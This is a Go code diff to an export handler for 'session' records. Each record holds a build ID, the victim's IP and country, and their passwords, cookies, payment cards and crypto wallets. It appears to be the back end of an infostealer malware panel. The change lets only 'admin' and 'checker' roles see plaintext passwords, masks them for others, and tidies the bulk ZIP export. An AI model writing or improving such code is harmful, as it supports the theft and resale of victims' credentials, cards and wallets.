@@ -26,6 +26,13 @@ func (h *ExportHandler) ExportSession(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	reveal := r.URL.Query().Get("reveal_passwords") == "true"
+	if reveal {
+		if claims, ok := getClaims(r); !ok || (claims.Role != "admin" && claims.Role != "checker") {
+			reveal = false
+		}
+	}
+
 	var s struct {
 		ID          string
 		BuildID     string
@@ -51,6 +58,13 @@ func (h *ExportHandler) ExportSession(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	passwords := queryPasswords(h.db, id)
+	if !reveal {
+		for i := range passwords {
+			passwords[i].PasswordValue = "[MASKED]"
+		}
+	}
+
 	resp := SessionDetailResponse{
 		ID:          s.ID,
 		BuildID:     s.BuildID,
@@ -60,7 +74,7 @@ func (h *ExportHandler) ExportSession(w http.ResponseWriter, r *http.Request) {
 		Ip:          s.Ip,
 		CountryCode: s.CountryCode,
 		CreatedAt:   s.CreatedAt,
-		Passwords:   queryPasswords(h.db, id),
+		Passwords:   passwords,
 		Cookies:     queryCookies(h.db, id),
 		Cards:       queryCards(h.db, id),
 		Wallets:     queryWalletsWithIcons(h.db, id),
@@ -165,7 +179,9 @@ func (h *ExportHandler) ExportBulk(w http.ResponseWriter, r *http.Request) {
 		if err != nil {
 			continue
 		}
-		f.Write(data)
+		if _, err := f.Write(data); err != nil {
+			continue
+		}
 	}
 
 	zw.Close()
